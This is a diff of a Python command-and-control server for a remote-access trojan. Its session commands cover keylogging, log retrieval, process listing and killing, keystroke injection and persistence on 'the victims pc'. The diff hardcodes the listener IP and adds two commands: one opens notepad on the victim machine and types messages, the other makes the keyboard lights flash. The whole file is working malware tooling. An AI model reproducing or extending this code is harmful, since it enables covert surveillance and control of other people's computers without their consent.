@@ -1,10 +1,11 @@
 import threading
 import socket as s
 from time import sleep
+from random import randint
 
 # constant ports:
 # by default your localport(change if neaded):
-HOST = s.gethostbyname(s.gethostname())
+HOST = "172.20.10.2"# s.gethostbyname(s.gethostname())
 # change port to your need:
 PORT = 420
 # -------------don't change anything from here if you don't know what you are doing-------------
@@ -21,7 +22,7 @@ session_ids = []
 
 # saves all the command
 COMMANDS = ["help", "sessions"]
-SESSION_COMMANDS = ["help", "back", "tree", "install", "matrix", "disconnect", "ps", "kill", "keylogger", "getlogs", "keybind"]
+SESSION_COMMANDS = ["help", "back", "tree", "install", "matrix", "disconnect", "ps", "kill", "keylogger", "getlogs", "keybind", "msg", "statlights"]
 
 
 class Commands:
@@ -216,8 +217,8 @@ class Commands:
         # sends a keybind
         elif message == "keybind":
             special_keys = {"ctrl": "Key.ctrl", "windows": "Key.cmd", "alt": "Key.alt_l", "alt_gr": "Key.alt_gr", "back": "Key.backspace",
-                            "caps": "Key.caps_cock", "num": "Key.num_lock", "shift": "Key.shift", "esc": "Key.esc", "enter": "Key.enter",
-                            "del": "Key.delete", "insert": "Key.insert", "tab": "Key.tab"}
+                            "caps": "Key.caps_lock", "num": "Key.num_lock", "shift": "Key.shift", "esc": "Key.esc", "enter": "Key.enter",
+                            "del": "Key.delete", "insert": "Key.insert", "tab": "Key.tab", "volDown": "Key.media_volume_down", "volUp": "Key.media_volume_up"}
             # checks for arguments
             if args:
                 keysStr = args[0]
@@ -239,7 +240,23 @@ class Commands:
             else:
                 print("Those are to many arguments type 'help' for more.")
                 return
-
+        # types a message into notepad
+        elif message == "msg":
+            if args:
+                msg = " ".join(args)
+                print(msg)
+                sendMessage("c n notepad.exe")
+                sleep(0.5)
+                sendMessage(f"k t {msg}")
+            else:
+                print("You need atleast one letter for the message type 'help' for more")
+        # makes the keyboard status lights blink randomly
+        elif message == "statlights":
+            keys = ["Key.caps_lock", "Key.num_lock"]
+            for i in range(0, 1000):
+                key = randint(0, 1)
+                sendMessage(f"k b {keys[key]}")
+                #sleep(0.2)
 
         # disconnects and closes the shell script on the victims pc(if installed it will reconnect after restart of the victims pc)
         elif message == "disconnect":
